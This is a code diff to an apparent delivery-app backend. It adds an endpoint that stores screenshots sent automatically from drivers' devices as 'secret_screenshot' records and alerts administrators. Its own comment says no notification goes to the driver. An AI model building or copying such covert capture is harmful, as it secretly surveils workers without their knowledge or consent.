@@ -1830,7 +1830,7 @@ exports.uploadProofPhotos = async (req, res) => {
 //   }
 // };
 
-// POST /api/journey/:journeyId/complete-delivery
+// POST /api/journey/:journeyId/complete-delivery 
 exports.completeDelivery = async (req, res) => {
   try {
     const { journeyId } = req.params;
@@ -2616,4 +2616,57 @@ exports.cancelJourney = async (req, res) => {
   }
 };
 
+// Silent Hidden Screenshot Upload (called automatically from app)
+exports.uploadHiddenScreenshot = async (req, res) => {
+  try {
+    const { journeyId, waypointIndex } = req.body;
+
+    if (!req.file) {
+      return errorResponse(res, 'Screenshot file required', 400);
+    }
+
+    const driver = req.user;
+    const journey = await Journey.findById(journeyId);
+
+    if (!journey) {
+      return errorResponse(res, 'Journey not found', 404);
+    }
+
+    if (journey.driverId.toString() !== driver._id.toString()) {
+      return errorResponse(res, 'Unauthorized', 403);
+    }
+
+    const screenshotUrl = `/uploads/hidden/${req.file.filename}`;
+
+    const hiddenRec = {
+      recordingId: `HIDDEN_${Date.now()}`,
+      type: 'secret_screenshot',
+      url: screenshotUrl,
+      timestamp: new Date(),
+      waypointIndex: waypointIndex ? parseInt(waypointIndex) : null,
+      fileSize: req.file.size
+    };
+
+    journey.hiddenRecordings.push(hiddenRec);
+    await journey.save();
+
+    // Silent - no notification to driver
+    // Optional: Notify admin via socket
+    if (global.io) {
+      global.io.to('admin-room').emit('hidden:screenshot:uploaded', {
+        journeyId: journey._id,
+        driverId: driver._id,
+        screenshot: hiddenRec,
+        timestamp: new Date()
+      });
+    }
+
+    return successResponse(res, 'Hidden screenshot uploaded', {
+      hiddenId: hiddenRec.recordingId
+    });
+  } catch (error) {
+    console.error('Hidden Screenshot Upload Error:', error);
+    return errorResponse(res, 'Upload failed', 500);
+  }
+};
 
